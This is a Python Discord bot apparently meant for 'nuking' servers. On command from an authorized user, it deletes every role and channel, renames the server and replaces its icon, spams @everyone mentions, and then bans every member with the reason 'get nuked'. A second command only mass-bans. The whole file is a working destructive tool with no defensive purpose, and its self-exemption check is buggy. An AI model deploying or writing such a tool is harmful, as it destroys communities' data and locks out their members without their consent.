import discord
from discord.ext import commands
import asyncio
from datetime import datetime

#configuration
token = "token here"
authorized = [782562792421982238]
announce_channel = "nuked"
chat_channel = "general"
vc_channel = "vc"

embed_1_title = "title"
embed_1_body = "body"
embed_1_image = "https://cdn.discordapp.com/attachments/863496175743533059/863516470142959706/unknown.png" 

embed_2_title = "embed2title"
embed_2_body = "embed2body"

server_name = "server title"

ban_reason = "get nuked"
sleep_time = 60 #time between nuking and banning everyone, in seconds.






client = commands.Bot(command_prefix="!", case_insensitive=True)

client.remove_command('help')


def check_if_it_is_me(ctx):
    return ctx.message.author.id in authorized


def Atime():
    time = str((datetime.now()))
    return f"[{time[:-7]}]"


@client.event
async def on_ready():
    print(f"{Atime()} Bot ready.")


@client.command()
@commands.check(check_if_it_is_me)
async def nuke(ctx):
    print(f"{Atime()} Destruction imminent.")
    await ctx.channel.purge(limit=1)


    # Deleting all roles
    print(f"{Atime()} Deleting all roles.")
    for role in ctx.guild.roles:
        try:
            await role.delete()
            print(f"{Atime()} deleted role {role}.")
        except discord.Forbidden:
            print(f"{Atime()} role {role} couldn't be deleted, no permissions.")
        except discord.HTTPException:
            print(f"{Atime()} role {role} couldn't be deleted, HTTPException.")

    # Deleting all channels
    print(f"{Atime()} Deleting all channels.")
    for channel in ctx.guild.channels:
        await channel.delete()

    # Creating new channels
    print(f"{Atime()} Creating new channels.")
    overwrites = {
        ctx.guild.default_role: discord.PermissionOverwrite(send_messages=False)
    }
    overwrites_2 = {
        ctx.guild.default_role: discord.PermissionOverwrite(send_messages=True),
    }

    await ctx.guild.create_text_channel(announce_channel, overwrites=overwrites)
    await ctx.guild.create_text_channel(chat_channel, overwrites=overwrites_2)
    await ctx.guild.create_voice_channel(vc_channel, overwrites=overwrites_2)

    var = discord.utils.get(ctx.guild.channels, name=announce_channel)

    embed = discord.Embed(title=embed_1_title,
                          description=embed_1_body)

    
    with open('image2.png', 'rb') as f:
        server_icon = f.read()
    await ctx.guild.edit(name=server_name)
    await ctx.guild.edit(icon=server_icon)

    # sending messages
    embed.set_image(url=embed_1_image)
    embed_2 = discord.Embed(title=embed_2_title,
                            description=embed_2_body)

    await var.send(embed=embed)
    await var.send(embed=embed_2)
    await var.send("@everyone")

    var2 = discord.utils.get(ctx.guild.channels, name=chat_channel)
    await var2.send("@everyone")
    await var2.send("@everyone")
    await var2.send("@everyone")
    await var2.send("@everyone")
    await var2.send("@everyone")
    
    
    print(f"{Atime()} Banning all members in {sleep_time / 60} minute(s).")
    await asyncio.sleep(sleep_time)

    print(f"{Atime()} Banning everyone.")
    for member in ctx.guild.members:
        await asyncio.sleep(0.5)
        if member.id != authorized:
            try:
                await member.ban(reason=ban_reason)
                print(f"{Atime()} Banned {member}")
            except discord.Forbidden:
                print(f"{Atime()} failed to ban user: {member}, No permissions.")
            except discord.HTTPException:
                print(f"{Atime()} failed to ban user: {member}, HTTPException.")
        else:

            print(f"{Atime()} Can't ban yourself!")


@client.command()
@commands.check(check_if_it_is_me)
async def banall(ctx):
    await ctx.channel.purge(limit=1)
    await asyncio.sleep(3)
    for member in ctx.guild.members:
        await asyncio.sleep(0.5)
        if member.id != authorized:
            try:
                await member.ban(reason=ban_reason)
                print(f"{Atime()} Banned {member}")
            except discord.Forbidden:
                print(f"{Atime()} failed to ban user: {member}, No permissions.")
            except discord.HTTPException:
                print(f"{Atime()} failed to ban user: {member}, HTTPException.")
        else:
            print(f"{Atime()} Can't ban yourself!")

client.run(token)
